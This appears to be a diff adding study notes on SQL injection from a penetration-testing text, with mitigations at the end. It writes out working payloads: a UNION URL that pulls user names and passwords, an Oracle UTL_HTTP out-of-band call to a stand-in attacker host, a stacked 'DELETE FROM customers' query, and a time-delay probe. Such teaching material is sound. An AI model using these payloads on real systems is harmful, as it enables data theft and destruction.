@@ -1,0 +1,212 @@
+An attacker takes advantage of code injection vulnerabilities by injecting code into a vulnerable system to change the course of execution and force an application or a system to process invalid data. Successful exploitation can lead to the disclosure of sensitive information, manipulation of data, denial-of-service (DoS) conditions, and more. 
+The following are examples of injection-based vulnerabilities that are discussed in the following sections:
+
+SQL injection vulnerabilities
+HTML injection vulnerabilities
+Command injection vulnerabilities
+Lightweight Directory Access Protocol (LDAP) injection vulnerabilities
+
+ SQL Injection Vulnerabilities
+
+SQL injection (SQLi) vulnerabilities can be catastrophic because they can allow an attacker to view, insert, delete, or modify records in a database.
+In injection attack, the attacker inserts, or injects, partial or complete SQL queries via the web application.
+The attacker injects SQL commands into input fields in an application or a URL in order to execute predefined SQL commands.
+
+As you may know, the following are some of the most common SQL statements (commands):
+
+SELECT: Used to obtain data from a database
+UPDATE: Used to update data in a database
+DELETE: Used to delete data from a database
+INSERT INTO: Used to insert new data into a database
+CREATE DATABASE: Used to create a new database
+ALTER DATABASE: Used to modify a database
+CREATE TABLE: Used to create a new table
+ALTER TABLE: Used to modify a table
+DROP TABLE: Used to delete a table
+CREATE INDEX: Used to create an index or a search key element
+DROP INDEX: Used to delete an index
+
+Typically, SQL statements are divided into the following categories:
+
+Data definition language (DDL) statements
+Data manipulation language (DML) statements
+Transaction control statements
+Session control statements
+System control statements
+Embedded SQL statements
+
+SQL Syntax
+SELECT * FROM Customers;
+
+Web applications construct SQL statements involving SQL syntax invoked by the application mixed with user-supplied data.
+If an application does not sanitize user input, an attacker can supply crafted input in an attempt to make the original SQL statement execute further actions in the database.
+
+SQL injections can be accomplished using user-supplied strings or numeric input. Figure 6-9 shows an example of using WebGoat to carry out a basic SQL injection attack.
+
+ When the string Smith' or '1'='1 is entered in the web form, it causes the application to display all records in the database table to the attacker.
+
+NOTE Download WebGoat or run WebSploit Labs and complete all the exercises related to SQL injection to practice in a safe environment.
+
+
+One of the first steps when you find SQL injection vulnerabilities is to understand when the application interacts with a database.
+This is typically done with web authentication forms, search engines, and interactive sites such as e-commerce sites.
+
+This is typically done with web authentication forms, search engines, and interactive sites such as e-commerce sites.
+
+As a penetration tester, you can start by adding a single quote (‘) or a semicolon ( ; ) to the field or parameter in a web form. 
+The single quote is used in SQL as a string terminator. If the application does not filter it correctly, you may be able to retrieve records or additional information that can help enhance your query or statement.
+
+You can also use comment delimiters (such as -- or /* */ ), as well as other SQL keywords, including AND and OR operands. 
+Another simple test is to insert a string where a number is expected.
+
+SQL Injection Categories
+
+SQL injection attacks can be divided into the following categories:
+
+In-band SQL injection: With this type of injection, the attacker obtains the data by using the same channel that is used to inject the SQL code. This is the most basic form of an SQL injection attack, where the data is dumped directly in a web application (or web page).
+Out-of-band SQL injection: With this type of injection, the attacker retrieves data using a different channel. For example, an email, a text, or an instant message could be sent to the attacker with the results of the query; or the attacker might be able to send the compromised data to another system.
+Blind (or inferential) SQL injection: With this type of injection, the attacker does not make the application display or transfer any data; rather, the attacker is able to reconstruct the information by sending specific statements and discerning the behavior of the application and database.
+
+TIP To perform an SQL injection attack, an attacker must craft a syntactically correct SQL statement (query).
+The attacker may also take advantage of error messages coming back from the application and might be able to reconstruct the logic of the original query to understand how to execute the attack correctly.
+If the application hides the error details, the attacker might need to reverse engineer the logic of the original query.
+
+There are essentially five techniques that can be used to exploit SQL injection vulnerabilities:
+
+Union operator: This is typically used when an SQL injection vulnerability allows a SELECT statement to combine two queries into a single result or a set of results.
+Boolean: This is used to verify whether certain conditions are true or false.
+Error-based technique: This is used to force the database to generate an error in order to enhance and refine an attack (injection).
+Out-of-band technique: This is typically used to obtain records from the database by using a different channel. For example, it is possible to make an HTTP connection to send the results to a different web server or a local machine running a web service.
+Time delay: It is possible to use database commands to delay answers. An attacker may use this technique when he or she doesn’t get output or error messages from the application.
+
+
+Database Fingerprinting
+In order to successfully execute complex queries and exploit different combinations of SQL injections, you must first fingerprint the database.
+The SQL language is defined in the ISO/IEC 9075 standard. 
+However, databases differ from one another in terms of their ability to perform additional commands, their use of functions to retrieve data, and other features.
+
+When performing more advanced SQL injection attacks, an attacker needs to know what back-end database the application uses (for example, Oracle, MariaDB, MySQL, PostgreSQL).
+One of the easiest ways to fingerprint a database is to pay close attention to any errors returned by the application,
+as demonstrated in the following syntax error message from a MySQL database:
+
+ MySQL Error 1064: You have an error in your SQL syntax
+
+NOTE You can obtain detailed information about MySQL error messages from https://dev.mysql.com/doc/refman/8.0/en/error-handling.html.
+NOTE You can find additional information about Microsoft SQL Server database error codes at https://learn.microsoft.com/en-us/sql/relational-databases/errors-events/database-engine-events-and-errors.
+
+NOTE You can search for Oracle database error codes at https://docs.oracle.com/database/121/ERRMG/toc.htm.
+
+If you are trying to fingerprint a database, and there is no error message from the database, you can try using concatenation, as shown here:
+
+  MySQL: 'finger' + 'printing'
+SQL Server: 'finger' 'printing'
+Oracle: 'finger'||'printing'
+PostgreSQL: 'finger'||'printing'
+
+
+The UNION Exploitation Technique
+
+The SQL UNION operator is used to combine the result sets of two or more SELECT statements, as shown here:
+
+ SELECT zipcode FROM h4cker_customers
+UNION
+SELECT zipcode FROM h4cker_suppliers;
+By default, the UNION operator selects only distinct values. You can use the UNION ALL operator if you want to allow duplicate values.
+
+
+Attackers may use the UNION operator in SQL injections attacks to join queries. The main goal of this strategy is to obtain the values of columns of other tables. 
+The following is an example of a UNION -based SQL injection attack:
+
+  SELECT zipcode FROM h4cker_customers WHERE zip=1 UNION ALL
+SELECT creditcard FROM payments
+
+
+The following is an example of a UNION-based SQL injection attack using a URL:
+https://store.h4cker.org/buyme.php?id=1234' UNION SELECT 1, user_name,password,'1','1','1',1 FROM user_system_data -
+
+
+Booleans in SQL Injection Attacks
+
+The Boolean technique is typically used in blind SQL injection attacks. 
+In blind SQL injection vulnerabilities, the vulnerable application typically does not return an SQL error, but it could return an HTTP 500 message, a 404 message, or a redirect.
+
+Out-of-Band Exploitation
+
+The out-of-band exploitation technique is very useful when you are exploiting a blind SQL injection vulnerability. You can use database management system (DBMS) functions to execute an out-of-band connection to obtain the results of the blind SQL injection attack.
+
+Say that the malicious SQL string is as follows:
+
+https://store.h4cker.org/buyme.php?id=8||UTL_HTTP.request('malicious.h4cker.org')||(SELECT user FROM DUAL)--
+In this example, the attacker is using the value 8 combined with the result of Oracle’s function UTL_HTTP.request.
+
+
+TIP To perform this attack, you can set up a web server such as NGINX or Apache or use Netcat to start a listener (for example, nc -lvp 80). 
+One of the most common uses of Netcat for penetration testing involves creating reverse and bind shells. 
+A reverse shell is a shell initiated from the victim’s system to the attacker. 
+A bind shell is set up on the victim's system and “binds” to a specific port to listen for an incoming connection from the attacker. 
+A bind shell is often referred to as a backdoor.
+
+
+Stacked Queries
+
+In a normal SQL query, you can use a semicolon to specify that the end of a statement has been reached and what follows is a new one.
+This technique allows you to execute multiple statements in the same call to the database. 
+
+UNION queries used in SQL injection attacks are limited to SELECT statements. However, stacked queries can be used to execute any SQL statement or procedure.
+1; DELETE FROM customers
+SELECT * FROM customers WHERE customer_id=1; DELETE FROM customers
+
+
+The Time-Delay SQL Injection Technique
+
+When trying to exploit a blind SQL injection, the Boolean technique is very helpful. 
+Another trick is to also induce a delay in the response, which indicates that the result of the conditional query is true.
+
+The time-delay technique varies from one database type/vendor to another.
+
+The following is an example of using the time-delay technique against a MySQL server:
+
+https://store.h4cker.org/buyme.php?id=8 AND IF(version() like '8%', sleep(10), 'false'))--
+
+In this example, the query checks whether the MySQL version is 8.x and then forces the server to delay the answer by 10 seconds. 
+The attacker can increase the delay time and monitor the responses.
+
+Surveying a Stored Procedure SQL Injection
+A stored procedure is one or more SQL statements or a reference to an SQL server. 
+Stored procedures can accept input parameters and return multiple values in the form of output parameters to the calling program.
+
+If an SQL server does not sanitize user input, it is possible to enter malicious SQL statements that will be executed within the stored procedure.
+The following example illustrates the concept of a stored procedure:
+
+Create procedure user_login @username varchar(20), @passwd varchar(20) As Declare @sqlstring varchar(250)
+Set @sqlstring = ' Select 1 from users Where username = ' + @username + ' and passwd = ' + @passwd exec(@sqlstring) Go
+
+By entering omar or 1=1' somepassword in a vulnerable application where the input is not sanitized, an attacker could obtain the password as well as other sensitive information from the database.
+
+You can use tools such as SQLmap to automate an SQL injection attack. SQLmap comes installed by default in Kali Linux and Parrot OS. In addition, you can download it from https://sqlmap.org and install it on any compatible Linux system.
+
+
+SQL Injection Mitigations
+
+Input validation is an important part of mitigating SQL injection attacks. The best mitigation for SQL injection vulnerabilities is to use immutable queries, such as the following:
+
+Static queries
+Parameterized queries
+Stored procedures (if they do not generate dynamic SQL)
+
+Immutable queries do not contain data that could get interpreted. In some cases, they process the data as a single entity that is bound to a column without interpretation.
+
+The following are two examples of static queries:
+
+  select * from contacts;
+select * from users where user = "omar";
+
+The following are examples of parameterized queries:
+
+  String query = "SELECT * FROM users WHERE name = ?";
+PreparedStatement statement =
+connection.prepareStatement(query);
+statement.setString(1, username);
+ResultSet results = statement.executeQuery();
+
+
